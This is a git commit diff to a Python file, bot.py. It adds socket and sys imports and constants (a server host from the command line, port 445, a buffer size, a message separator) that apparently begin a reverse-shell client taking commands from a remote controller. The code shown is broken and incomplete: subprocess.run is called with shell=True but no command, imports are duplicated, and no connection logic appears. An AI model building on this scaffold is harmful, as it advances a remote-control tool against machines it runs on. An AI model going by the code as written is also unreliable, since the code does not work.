39c023d124c84143adb95b15eac8af735a75b0f8
AlexVasquezz <144260118+AlexVasquezz@users.noreply.github.com>
2023-09-07 16:11:21 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,7 +1,13 @@
 import os
 import socket,subprocess,os
 import subprocess
+import socket
+import sys
 
 def run():
     subprocess.run(shell=True)
-    
+    SERVER_HOST = sys.argv[1]
+    SERVER_PORT = 445
+    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
+    # separator string for sending 2 messages in one go
+    SEPARATOR = "<sep>"
